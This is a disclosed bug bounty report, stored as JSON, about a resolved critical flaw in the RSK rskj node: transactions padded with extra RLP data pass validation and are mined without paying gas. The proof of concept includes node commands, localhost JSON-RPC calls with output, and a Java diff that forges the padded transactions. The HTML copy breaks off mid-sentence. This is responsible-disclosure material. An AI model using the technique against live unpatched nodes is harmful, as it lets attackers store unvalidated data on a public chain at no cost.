{"id":396954,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTY5NTQ=","url":"https://hackerone.com/reports/396954","title":"Attacker can add arbitrary data to the blockchain without paying gas","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-08-19T06:05:36.037Z","submitted_at":"2018-08-19T06:05:36.037Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ahook","url":"/ahook","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":25854,"url":"https://hackerone.com/iovlabs","handle":"iovlabs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/Prz5MCDWRGv5MpRAQsmSVoLw/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/Prz5MCDWRGv5MpRAQsmSVoLw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"IOVLabs","twitter_handle":"iovlabs","website":"https://www.iovlabs.org/","about":"Building Value Networks"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-09-18T13:18:55.944Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-09-18T13:07:35.212Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\nDue to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.\n\n**Description:**\nThe issue stems from the Transaction::rlpParse function:\nhttps://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java#L242\n\nOnce all the relevant data is pulled from the decoded RLP, there are no checks to ensure that we've reached the end of the data.\n\nSince the transaction is constructed using the raw encoded bytes, any future calls to getEncoded() will return the entire byte array, including the bad data at the end. Signature verification of the valid transaction will still pass because it uses getRawEncoded() to compute the signature, which ignores the extra data.\n\n## Steps To Reproduce:\nOn a remote server I start up a regtest node from a clean codebase. This will begin mining as a single-node network:\n```\nremote:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start\n```\n\nOn my local machine, I start another regtest node but I modify the config to a) talk to my remote node, and b) not mine. I don't mine on this node because I will be using it to manufacture beefy transactions and I want to make sure that other, clean nodes will accept/mine these transactions.\n\nIn addition to the config changes, I have also modified the eth_sendTransaction code to add extra rlp-encoded bytes to the end of the transaction. In order to easily see the data in a hex blob, I'm just setting it to a repeated 0xbeef string. I've also hacked the getBlockByHash function to return the full encoded hex block in the extraData field, as a quick way to query and see the raw block data.\n\n```\nlocal:~/rskj$ # Start the attacker's node:\nlocal:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start\nlocal:~/rskj$\nlocal:~/rskj$ # Create a new account:\nlocal:~/rskj$ curl -s -X POST -H \"Content-Type: application/json\" -d '{\"jsonrpc\":\"2.0\",\"method\":\"personal_newAccount\", \"params\": [\"beef\"], \"id\":666}' http://127.0.0.1:4444/\n{\"jsonrpc\":\"2.0\",\"id\":666,\"result\":\"0x0e016bdab929a365c7419ba51d0902cbde6035c2\"}\nlocal:~/rskj$\nlocal:~/rskj$ # Send a transaction:\nlocal:~/rskj$ curl -s -X POST -H \"Content-Type: application/json\" -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_sendTransaction\", \"params\": [{\"from\": \"0xCd2a3d9f938e13Cd947eC05ABC7fe734df8DD826\", \"to\":\"0x0e016bdab929a365c7419ba51d0902cbde6035c2\", \"gas\":\"0x76c0\", \"gasPrice\": \"0x9184e72a000\", \"value\":\"0x9184e72a\"}], \"id\":666}' http://127.0.0.1:4444/\n{\"jsonrpc\":\"2.0\",\"id\":666,\"result\":\"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301\"}\nlocal:~/rskj$\nlocal:~/rskj$ # Wait for the transaction to propagate to the remote server and be mined\nlocal:~/rskj$ # Then check the receipt to see that it made it into the block:\nlocal:~/rskj$ $ curl -s -X POST -H \"Content-Type: application/json\" -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getTransactionReceipt\", \"params\": [\"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301\"], \"id\":666}' http://127.0.0.1:4444/\n{\"jsonrpc\":\"2.0\",\"id\":666,\"result\":{\"transactionHash\":\"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301\",\"transactionIndex\":\"0x0\",\"blockHash\":\"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747\",\"blockNumber\":\"0x681\",\"cumulativeGasUsed\":\"0x5208\",\"gasUsed\":\"0x5208\",\"contractAddress\":null,\"logs\":[],\"from\":\"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826\",\"to\":\"0x0e016bdab929a365c7419ba51d0902cbde6035c2\",\"root\":\"0x01\",\"status\":\"0x01\"}}\nlocal:~/rskj$\nlocal:~/rskj$ # Now that we see our beefy transaction in the block, look up the raw block\nlocal:~/rskj$ curl -s -X POST -H \"Content-Type: application/json\" -d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByHash\", \"params\": [\"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747\", true], \"id\":666}' http://127.0.0.1:4444/\n{\"jsonrpc\":\"2.0\",\"id\":666,\"result\":{\"number\":\"0x681\",\"hash\":\"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747\",\"parentHash\":\"0x6101456ae392aeb4dfca1377cca9b407237eab308f079fe0e40d4f8533e5cf4b\",\"sha3Uncles\":\"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347\",\"logsBloom\":\"0x00000000000000000000000000000000000000002000000000200000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000080000000000000000000000000000080000000000000000000000000000000000000008000000000000000000000000000000000010000000000000000000000080000000100000020000000000000000000000000000001000000000020000000001000000000000018000000000000020000000000000200040100000000000000000000000000000000000000000000000000000000000000000000000\",\"transactionsRoot\":\"0x5e5bb633946b0b6a4c7e3128c6b12d6fdefc66b0dc925cea6d090c6dbdbb61e4\",\"stateRoot\":\"0xcacaa63cbd707618051669ea88c76aeeb82105f8adad76c7682f8a039b4e07d2\",\"receiptsRoot\":\"0x3f0773010b81c896ca4c9cccf6e69e0f3f32d62b82c23a957996d60c4104fabb\",\"miner\":\"0xec4ddeb4380ad69b3e509baad9f158cdf4e4681d\",\"difficulty\":\"0x01\",\"totalDifficulty\":\"0x682\",\"extraData\":\"0xf90383f902dba06101456ae392aeb4dfca1377cca9b407237eab308f079fe0e40d4f8533e5cf4ba01dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d4934794ec4ddeb4380ad69b3e509baad9f158cdf4e4681da0cacaa63cbd707618051669ea88c76aeeb82105f8adad76c7682f8a039b4e07d2a05e5bb633946b0b6a4c7e3128c6b12d6fdefc66b0dc925cea6d090c6dbdbb61e4a03f0773010b81c896ca4c9cccf6e69e0f3f32d62b82c23a957996d60c4104fabbb9010000000000000000000000000000000000000000002000000000200000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000080000000000000000000000000000080000000000000000000000000000000000000008000000000000000000000000000000000010000000000000000000000080000000100000020000000000000000000000000000001000000000020000000001000000000000018000000000000020000000000000200040100000000000000000000000000000000000000000000000000000000000000000000000018206818367c280825208845b78fd12808802ea11e32ad500000080b8507111010000000000000000000000000000000000000000000000000000000000000000009b6a3f2b95038fc2feba8c3641be2bfcc67ea6ea48519697a9ea0c1ab9ccbfbe12fd785bffff7f21670b0000a701000000019b6a3f2b95038fc2feba8c3641be2bfcc67ea6ea48519697a9ea0c1ab9ccbfbe0101b886000000000000040048d9465430728a2ba7f23b2792c24eaf61e134c8dafa6ec0fce944569ae2f7b752534b424c4f434b3aa74eb3b1efd29c88b6b250faa51e599dcf38b6bcf9080e0252cbf7574a29b54fffffffff0100f2052a01000000232103d3b2d67927fcbe6ea4f629d14f5938f6209186036e45833c3d51b3df80aab53aac00000000f8a2f880018609184e72a0008276c0940e016bdab929a365c7419ba51d0902cbde6035c2849184e72a8066a016e1fffd39de05273881dd8e2720664898bf28b34b57c568689eb3b969381d5aa05f157a0d01506a05685a2b9d4d74eb01b27486b00f6c3ac9823f1f6e12c732aa96beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeefdf82068000009400000000000000000000000000000000010000088080808080c0\",\"size\":\"0x386\",\"gasLimit\":\"0x67c280\",\"gasUsed\":\"0x5208\",\"timestamp\":\"0x5b78fd12\",\"transactions\":[{\"hash\":\"0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301\",\"nonce\":\"0x01\",\"blockHash\":\"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747\",\"blockNumber\":\"0x681\",\"transactionIndex\":\"0x0\",\"from\":\"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826\",\"to\":\"0x0e016bdab929a365c7419ba51d0902cbde6035c2\",\"gas\":\"0x76c0\",\"gasPrice\":\"0x09184e72a000\",\"value\":\"0x009184e72a\",\"input\":\"0x00\"},{\"hash\":\"0xa703402c0c77c41597a09088c0ef3c61bb608da4683f4de8b1a3569297a61b25\",\"nonce\":\"0x0680\",\"blockHash\":\"0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747\",\"blockNumber\":\"0x681\",\"transactionIndex\":\"0x1\",\"from\":\"0x0000000000000000000000000000000000000000\",\"to\":\"0x0000000000000000000000000000000001000008\",\"gas\":\"0x00\",\"gasPrice\":\"0x00\",\"value\":\"0\",\"input\":\"0x00\"}],\"uncles\":[],\"minimumGasPrice\":\"0\"}}\n```\n\nSorry for the giant data dump there, but if you take a look at the extraData in the returned block (which is actually the full block hex because of the hacked code), you can see that the \"beefbeefbeefbeef\" data made it in.\n\nThis is a proof that a malicious node (my local node) can craft a transaction with extra data appended, share that transaction with the network via the normal p2p process, and have the extra data mined into a block.\n\nHere's the full diff for the attacker/local node. Sorry again, it's a little hacky. I could have used the eth_sendRawTransaction endpoint, but I didn't want to go through the process of hand-constructing the rlp-encoded data:\n```\ndiff --git a/rskj-core/src/main/java/org/ethereum/core/Transaction.java b/rskj-core/src/main/java/org/ethereum/core/Transaction.java\nindex bbd21ee..801e18d 100644\n--- a/rskj-core/src/main/java/org/ethereum/core/Transaction.java\n+++ b/rskj-core/src/main/java/org/ethereum/core/Transaction.java\n@@ -164,7 +164,7 @@ public class Transaction {\n     }\n \n     public Transaction toImmutableTransaction() {\n-        return new ImmutableTransaction(this.getEncoded());\n+        return new ImmutableTransaction(this.getBeefyEncoded());\n     }\n \n     private byte extractChainIdFromV(byte v) {\n@@ -516,7 +516,17 @@ public class Transaction {\n         return rlpRaw;\n     }\n \n+    // Clear the rlpEncoded if present, and re-encode with extra 0xbeef data\n+    public byte[] getBeefyEncoded() {\n+        rlpEncoded = null;\n+        return getEncodedInternal(\"beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeef\");\n+    }\n+\n     public byte[] getEncoded() {\n+        return getEncodedInternal(null);\n+    }\n+    private byte[] getEncodedInternal(String beef) {\n         if (rlpEncoded != null) {\n             return rlpEncoded;\n         }\n@@ -556,8 +566,15 @@ public class Transaction {\n             s = RLP.encodeElement(EMPTY_BYTE_ARRAY);\n         }\n \n-        this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,\n-                toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);\n+        // if 0xbeef bytes are present, tack them on at the end of the tx\n+        if (beef != null) {\n+            this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,\n+                    toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s,\n+                    RLP.encodeElement(Hex.decode(beef)));\n+        } else {\n+            this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,\n+                    toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);\n+        }\n \n         Keccak256 hash = this.getHash();\n         this.hash = hash == null ? null : hash.getBytes();\ndiff --git a/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java b/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java\nindex 04d0ddb..ad0f3c1 100644\n--- a/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java\n+++ b/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java\n@@ -599,7 +599,8 @@ public class Web3Impl implements Web3 {\n         br.miner = isPending ? null : TypeConverter.toJsonHex(b.getCoinbase().getBytes());\n         br.difficulty = TypeConverter.toJsonHex(b.getDifficulty().getBytes());\n         br.totalDifficulty = TypeConverter.toJsonHex(this.blockchain.getBlockStore().getTotalDifficultyForHash(b.getHash().getBytes()).asBigInteger());\n-        br.extraData = TypeConverter.toJsonHex(b.getExtraData());\n+        // hacky, for testing, return the full encoded block instead of extraData\n+        br.extraData = TypeConverter.toJsonHex(b.getEncoded());\n         br.size = TypeConverter.toJsonHex(b.getEncoded().length);\n         br.gasLimit = TypeConverter.toJsonHex(b.getGasLimit());\n         Coin mgp = b.getMinimumGasPrice();\ndiff --git a/rskj-core/src/main/resources/config/regtest.conf b/rskj-core/src/main/resources/config/regtest.conf\nindex df111fa..1e81a7c 100644\n--- a/rskj-core/src/main/resources/config/regtest.conf\n+++ b/rskj-core/src/main/resources/config/regtest.conf\n@@ -8,12 +8,13 @@ peer {\n         # the peer window will show\n         # only what retrieved by active\n         # peer [true/false]\n-        enabled = false\n+        enabled = true\n \n         # List of the peers to start\n         # the search of the online peers\n         # values: [ip:port]\n-        ip.list = [ ]\n+        # replace \u003ctarget_ip\u003e with the \"real\" network node that will be mining\n+        ip.list = [\"\u003ctarget_ip\u003e:50501\"]\n     }\n \n     # Port for server to listen for incoming connections\n@@ -24,7 +25,8 @@ peer {\n }\n \n miner {\n-    server.enabled = true\n+    # Attacker node won't mine, so we know the tx propagated through the network\n+    server.enabled = false\n     client.enabled = true\n     minGasPrice = 0\n```\n\n## Impact\n\nThe attacker can add arbitrary data into the blockchain without paying the requisite gas or undergoing any validation of the extra data.\n\nI can think of three ways to get this data into the system: 1) the method I detailed in the above PoC, in which the attacker creates a valid transaction and adds the data, 2) a malicious miner could just add the data to any valid transaction it has in its pool; 3) an attacker could wait for new pending transactions to appear, then add their data and send the tx back to the network. If the attacker's version of the tx makes it to the miner that produces the next block, the data will make it to the chain without the attacker even needing to create their own valid tx.\n\nI have not checked to see how much data can be appended, but I assume its limited only by whatever overall block/transaction/message size constraints exist.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003cbr\u003e\nDue to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003cbr\u003e\nThe issue stems from the Transaction::rlpParse function:\u003cbr\u003e\n\u003ca title=\"https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java#L242\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frsksmart%2Frskj%2Fblob%2Fmaster%2Frskj-core%2Fsrc%2Fmain%2Fjava%2Forg%2Fethereum%2Fcore%2FTransaction.java%23L242\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java#L242\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eOnce all the relevant data is pulled from the decoded RLP, there are no checks to ensure that we\u0026#39;ve reached the end of the data.\u003c/p\u003e\n\n\u003cp\u003eSince the transaction is constructed using the raw encoded bytes, any future calls to getEncoded() will return the entire byte array, including the bad data at the end. Signature verification of the valid transaction will still pass because it uses getRawEncoded() to compute the signature, which ignores the extra data.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cp\u003eOn a remote server I start up a regtest node from a clean codebase. This will begin mining as a single-node network:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eremote:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOn my local machine, I start another regtest node but I modify the config to a) talk to my remote node, and b) not mine. I don\u0026#39;t mine on this node because I will be using it to manufacture beefy transactions and I want to make sure that other, clean nodes will accept/mine these transactions.\u003c/p\u003e\n\n\u003cp\u003eIn addition to the config changes, I have also modified the eth_sendTransaction code to add extra rlp-encoded bytes to the end of the transaction. In order to easily see the data in a hex blob, I\u0026#39;m just setting it to a repeated 0xbeef string. I\u0026#39;ve also hacked the getBlockByHash function to return the full encoded hex block in the extraData field, as a quick way to query and see the raw block data.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003elocal:~/rskj$ # Start the attacker\u0026#39;s node:\nlocal:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start\nlocal:~/rskj$\nlocal:~/rskj$ # Create a new account:\nlocal:~/rskj$ curl -s -X POST -H \u0026quot;Content-Type: application/json\u0026quot; -d \u0026#39;{\u0026quot;jsonrpc\u0026quot;:\u0026quot;2.0\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;personal_newAccount\u0026quot;, \u0026quot;params\u0026quot;: [\u0026quot;beef\u0026quot;], \u0026quot;id\u0026quot;:666}\u0026#39; http://127.0.0.1:4444/\n{\u0026quot;jsonrpc\u0026quot;:\u0026quot;2.0\u0026quot;,\u0026quot;id\u0026quot;:666,\u0026quot;result\u0026quot;:\u0026quot;0x0e016bdab929a365c7419ba51d0902cbde6035c2\u0026quot;}\nlocal:~/rskj$\nlocal:~/rskj$ # Send a transaction:\nlocal:~/rskj$ curl -s -X POST -H \u0026quot;Content-Type: application/json\u0026quot; -d \u0026#39;{\u0026quot;jsonrpc\u0026quot;:\u0026quot;2.0\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;eth_sendTransaction\u0026quot;, \u0026quot;params\u0026quot;: [{\u0026quot;from\u0026quot;: \u0026quot;0xCd2a3d9f938e13Cd947eC05ABC7fe734df8DD826\u0026quot;, \u0026quot;to\u0026quot;:\u0026quot;0x0e016bdab929a365c7419ba51d0902cbde6035c2\u0026quot;, \u0026quot;gas\u0026quot;:\u0026quot;0x76c0\u0026quot;, \u0026quot;gasPrice\u0026quot;: \u0026quot;0x9184e72a000\u0026quot;, \u0026quot;value\u0026quot;:\u0026quot;0x9184e72a\u0026quot;}], \u0026quot;id\u0026quot;:666}\u0026#39; http://127.0.0.1:4444/\n{\u0026quot;jsonrpc\u0026quot;:\u0026quot;2.0\u0026quot;,\u0026quot;id\u0026quot;:666,\u0026quot;result\u0026quot;:\u0026quot;0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301\u0026quot;}\nlocal:~/rskj$\nlocal:~/rskj$ # Wait for the transaction to propagate to the remote server and be mined\nlocal:~/rskj$ # Then check the receipt to see that it made it into the block:\nlocal:~/rskj$ $ curl -s -X POST -H \u0026quot;Content-Type: application/json\u0026quot; -d \u0026#39;{\u0026quot;jsonrpc\u0026quot;:\u0026quot;2.0\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;eth_getTransactionReceipt\u0026quot;, \u0026quot;params\u0026quot;: [\u0026quot;0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301\u0026quot;], \u0026quot;id\u0026quot;:666}\u0026#39; http://127.0.0.1:4444/\n{\u0026quot;jsonrpc\u0026quot;:\u0026quot;2.0\u0026quot;,\u0026quot;id\u0026quot;:666,\u0026quot;result\u0026quot;:{\u0026quot;transactionHash\u0026quot;:\u0026quot;0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301\u0026quot;,\u0026quot;transactionIndex\u0026quot;:\u0026quot;0x0\u0026quot;,\u0026quot;blockHash\u0026quot;:\u0026quot;0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747\u0026quot;,\u0026quot;blockNumber\u0026quot;:\u0026quot;0x681\u0026quot;,\u0026quot;cumulativeGasUsed\u0026quot;:\u0026quot;0x5208\u0026quot;,\u0026quot;gasUsed\u0026quot;:\u0026quot;0x5208\u0026quot;,\u0026quot;contractAddress\u0026quot;:null,\u0026quot;logs\u0026quot;:[],\u0026quot;from\u0026quot;:\u0026quot;0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826\u0026quot;,\u0026quot;to\u0026quot;:\u0026quot;0x0e016bdab929a365c7419ba51d0902cbde6035c2\u0026quot;,\u0026quot;root\u0026quot;:\u0026quot;0x01\u0026quot;,\u0026quot;status\u0026quot;:\u0026quot;0x01\u0026quot;}}\nlocal:~/rskj$\nlocal:~/rskj$ # Now that we see our beefy transaction in the block, look up the raw block\nlocal:~/rskj$ curl -s -X POST -H \u0026quot;Content-Type: application/json\u0026quot; -d \u0026#39;{\u0026quot;jsonrpc\u0026quot;:\u0026quot;2.0\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;eth_getBlockByHash\u0026quot;, \u0026quot;params\u0026quot;: [\u0026quot;0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747\u0026quot;, true], \u0026quot;id\u0026quot;:666}\u0026#39; http://127.0.0.1:4444/\n{\u0026quot;jsonrpc\u0026quot;:\u0026quot;2.0\u0026quot;,\u0026quot;id\u0026quot;:666,\u0026quot;result\u0026quot;:{\u0026quot;number\u0026quot;:\u0026quot;0x681\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747\u0026quot;,\u0026quot;parentHash\u0026quot;:\u0026quot;0x6101456ae392aeb4dfca1377cca9b407237eab308f079fe0e40d4f8533e5cf4b\u0026quot;,\u0026quot;sha3Uncles\u0026quot;:\u0026quot;0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347\u0026quot;,\u0026quot;logsBloom\u0026quot;:\u0026quot;0x00000000000000000000000000000000000000002000000000200000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000080000000000000000000000000000080000000000000000000000000000000000000008000000000000000000000000000000000010000000000000000000000080000000100000020000000000000000000000000000001000000000020000000001000000000000018000000000000020000000000000200040100000000000000000000000000000000000000000000000000000000000000000000000\u0026quot;,\u0026quot;transactionsRoot\u0026quot;:\u0026quot;0x5e5bb633946b0b6a4c7e3128c6b12d6fdefc66b0dc925cea6d090c6dbdbb61e4\u0026quot;,\u0026quot;stateRoot\u0026quot;:\u0026quot;0xcacaa63cbd707618051669ea88c76aeeb82105f8adad76c7682f8a039b4e07d2\u0026quot;,\u0026quot;receiptsRoot\u0026quot;:\u0026quot;0x3f0773010b81c896ca4c9cccf6e69e0f3f32d62b82c23a957996d60c4104fabb\u0026quot;,\u0026quot;miner\u0026quot;:\u0026quot;0xec4ddeb4380ad69b3e509baad9f158cdf4e4681d\u0026quot;,\u0026quot;difficulty\u0026quot;:\u0026quot;0x01\u0026quot;,\u0026quot;totalDifficulty\u0026quot;:\u0026quot;0x682\u0026quot;,\u0026quot;extraData\u0026quot;:\u0026quot;0xf90383f902dba06101456ae392aeb4dfca1377cca9b407237eab308f079fe0e40d4f8533e5cf4ba01dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d4934794ec4ddeb4380ad69b3e509baad9f158cdf4e4681da0cacaa63cbd707618051669ea88c76aeeb82105f8adad76c7682f8a039b4e07d2a05e5bb633946b0b6a4c7e3128c6b12d6fdefc66b0dc925cea6d090c6dbdbb61e4a03f0773010b81c896ca4c9cccf6e69e0f3f32d62b82c23a957996d60c4104fabbb9010000000000000000000000000000000000000000002000000000200000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000080000000000000000000000000000080000000000000000000000000000000000000008000000000000000000000000000000000010000000000000000000000080000000100000020000000000000000000000000000001000000000020000000001000000000000018000000000000020000000000000200040100000000000000000000000000000000000000000000000000000000000000000000000018206818367c280825208845b78fd12808802ea11e32ad500000080b8507111010000000000000000000000000000000000000000000000000000000000000000009b6a3f2b95038fc2feba8c3641be2bfcc67ea6ea48519697a9ea0c1ab9ccbfbe12fd785bffff7f21670b0000a701000000019b6a3f2b95038fc2feba8c3641be2bfcc67ea6ea48519697a9ea0c1ab9ccbfbe0101b886000000000000040048d9465430728a2ba7f23b2792c24eaf61e134c8dafa6ec0fce944569ae2f7b752534b424c4f434b3aa74eb3b1efd29c88b6b250faa51e599dcf38b6bcf9080e0252cbf7574a29b54fffffffff0100f2052a01000000232103d3b2d67927fcbe6ea4f629d14f5938f6209186036e45833c3d51b3df80aab53aac00000000f8a2f880018609184e72a0008276c0940e016bdab929a365c7419ba51d0902cbde6035c2849184e72a8066a016e1fffd39de05273881dd8e2720664898bf28b34b57c568689eb3b969381d5aa05f157a0d01506a05685a2b9d4d74eb01b27486b00f6c3ac9823f1f6e12c732aa96beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeefdf82068000009400000000000000000000000000000000010000088080808080c0\u0026quot;,\u0026quot;size\u0026quot;:\u0026quot;0x386\u0026quot;,\u0026quot;gasLimit\u0026quot;:\u0026quot;0x67c280\u0026quot;,\u0026quot;gasUsed\u0026quot;:\u0026quot;0x5208\u0026quot;,\u0026quot;timestamp\u0026quot;:\u0026quot;0x5b78fd12\u0026quot;,\u0026quot;transactions\u0026quot;:[{\u0026quot;hash\u0026quot;:\u0026quot;0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301\u0026quot;,\u0026quot;nonce\u0026quot;:\u0026quot;0x01\u0026quot;,\u0026quot;blockHash\u0026quot;:\u0026quot;0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747\u0026quot;,\u0026quot;blockNumber\u0026quot;:\u0026quot;0x681\u0026quot;,\u0026quot;transactionIndex\u0026quot;:\u0026quot;0x0\u0026quot;,\u0026quot;from\u0026quot;:\u0026quot;0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826\u0026quot;,\u0026quot;to\u0026quot;:\u0026quot;0x0e016bdab929a365c7419ba51d0902cbde6035c2\u0026quot;,\u0026quot;gas\u0026quot;:\u0026quot;0x76c0\u0026quot;,\u0026quot;gasPrice\u0026quot;:\u0026quot;0x09184e72a000\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;0x009184e72a\u0026quot;,\u0026quot;input\u0026quot;:\u0026quot;0x00\u0026quot;},{\u0026quot;hash\u0026quot;:\u0026quot;0xa703402c0c77c41597a09088c0ef3c61bb608da4683f4de8b1a3569297a61b25\u0026quot;,\u0026quot;nonce\u0026quot;:\u0026quot;0x0680\u0026quot;,\u0026quot;blockHash\u0026quot;:\u0026quot;0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747\u0026quot;,\u0026quot;blockNumber\u0026quot;:\u0026quot;0x681\u0026quot;,\u0026quot;transactionIndex\u0026quot;:\u0026quot;0x1\u0026quot;,\u0026quot;from\u0026quot;:\u0026quot;0x0000000000000000000000000000000000000000\u0026quot;,\u0026quot;to\u0026quot;:\u0026quot;0x0000000000000000000000000000000001000008\u0026quot;,\u0026quot;gas\u0026quot;:\u0026quot;0x00\u0026quot;,\u0026quot;gasPrice\u0026quot;:\u0026quot;0x00\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;input\u0026quot;:\u0026quot;0x00\u0026quot;}],\u0026quot;uncles\u0026quot;:[],\u0026quot;minimumGasPrice\u0026quot;:\u0026quot;0\u0026quot;}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSorry for the giant data dump there, but if you take a look at the extraData in the returned block (which is actually the full block hex because of the hacked code), you can see that the \u0026quot;beefbeefbeefbeef\u0026quot; data made it in.\u003c/p\u003e\n\n\u003cp\u003eThis is a proof that a malicious node (my local node) can craft a transaction with extra data appended, share that 